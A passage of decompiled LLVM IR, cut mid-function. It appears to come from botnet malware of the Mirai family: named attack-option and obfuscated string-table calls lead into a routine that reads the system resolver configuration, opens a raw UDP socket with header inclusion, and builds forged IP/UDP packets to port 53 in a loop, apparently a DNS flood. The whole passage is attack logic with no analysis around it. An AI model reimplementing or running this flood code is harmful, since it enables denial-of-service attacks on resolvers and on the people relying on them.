  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 26)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 26, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 26)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 27)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 27, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 27)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_24f80.59, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
